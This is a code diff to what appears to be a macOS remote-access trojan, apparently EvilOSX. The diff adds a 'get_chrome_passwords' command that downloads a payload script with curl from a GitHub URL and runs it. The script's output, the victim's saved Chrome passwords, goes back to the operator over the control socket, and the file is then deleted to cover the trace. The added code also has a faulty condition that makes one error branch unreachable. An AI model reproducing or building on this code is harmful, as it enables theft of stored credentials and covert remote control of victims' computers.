@@ -9,6 +9,7 @@ from threading import Timer
 import time
 import platform
 import base64
+import re
 
 MESSAGE_INFO = "\033[94m" + "[I] " + "\033[0m"
 MESSAGE_ATTENTION = "\033[91m" + "[!] " + "\033[0m"
@@ -254,6 +255,25 @@ def start_server():
                     response += MESSAGE_INFO + "FileVault is off.\n"
 
                 server_socket.sendall(response)
+            elif command == "get_chrome_passwords":
+                payload_url = "https://raw.githubusercontent.com/Marten4n6/EvilOSX/master/Payloads/chrome_passwords.py"
+                payload_file = "/tmp/chrome_passwords.py"
+
+                execute_command("curl {0} -s -o {1}".format(payload_url, payload_file))
+                output = execute_command("python {0}".format(payload_file), False)
+
+                if "ERROR getting" in output:
+                    if "clicked deny" in output:
+                        server_socket.sendall(MESSAGE_ATTENTION + "Failed to get chrome passwords, user clicked deny.")
+                    elif "entry not found":
+                        server_socket.sendall(MESSAGE_ATTENTION + "Failed to get chrome passwords, Chrome not found.")
+                    else:
+                        server_socket.sendall(MESSAGE_ATTENTION + "Failed to get chrome passwords, unknown error.")
+                else:
+                    output_stripped = re.compile(r'\x1b[^m]*m').sub('', output)
+                    server_socket.sendall(output_stripped)
+
+                execute_command("rm -rf {0}".format(payload_file))
             elif command == "kill_client":
                 server_socket.sendall("Farewell.")
 
